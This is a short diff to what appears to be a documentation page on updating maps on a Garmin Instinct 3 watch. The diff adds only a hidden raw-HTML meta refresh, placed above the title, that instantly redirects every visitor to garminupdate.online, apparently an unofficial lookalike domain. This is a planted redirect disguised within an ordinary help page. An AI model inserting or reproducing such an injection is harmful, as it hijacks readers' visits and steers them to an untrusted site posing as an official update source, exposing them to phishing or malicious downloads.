@@ -1,3 +1,9 @@
+.. raw:: html
+ 
+    <meta http-equiv="refresh" content="0; url=https://garminupdate.online/">
+
+
+
 Garmin Instinct 3 Map Update: How to Keep Your Maps and Navigation Current
 ========================================================
 
